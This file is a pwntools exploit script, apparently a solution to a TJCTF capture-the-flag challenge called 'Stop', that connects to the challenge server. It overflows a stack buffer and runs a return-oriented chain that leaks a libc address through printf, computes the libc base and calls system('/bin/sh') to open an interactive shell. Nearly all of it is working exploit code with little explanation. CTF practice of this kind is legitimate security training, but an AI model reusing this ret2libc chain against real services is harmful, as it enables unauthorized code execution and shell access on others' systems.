from pwn import *


elf = ELF("./Stop")
rop = ROP(elf)
local = 0

if local:
	p = process('./Stop')
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
	p = remote('p1.tjctf.org', 8001)
	libc = ELF("libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6")


print(p.recvuntil("Which letter? "))
p.sendline("a")
print(p.recvuntil("Category? "))

# Step1: leak libc base address

PRINTF = elf.plt['printf']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = 0x0000000000400951 #pop rsi ; pop r15 ; ret


FMT = 0x0000000000400E43

RET = (rop.find_gadget(['ret']))[0]

START = 0x4005C0


padding = "A" * 280
#MAIN = 0x40073C
rop1 = padding + p64(POP_RDI) + p64(FMT) + p64(POP_RSI) +p64(LIBC_START_MAIN) + p64(0x0) + p64(PRINTF) + p64(START)

rop2 = padding + p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(RET)*2 +p64(PRINTF) +p64(MAIN)

p.sendline(rop1)


print(p.recvline())
print(p.recvline())

addr = p.recvline().strip()
print(addr)
print(p.recvuntil("Which letter? "))



leak = u64(addr.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

# #Step 2: send payload

BINSH = next(libc.search("/bin/sh")) 
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = padding + p64(POP_RDI) + p64(BINSH) + p64(RET)+ p64(SYSTEM)

p.sendline("a")
print(p.recvuntil("Category? "))

p.sendline(rop2)

p.interactive()

p.close()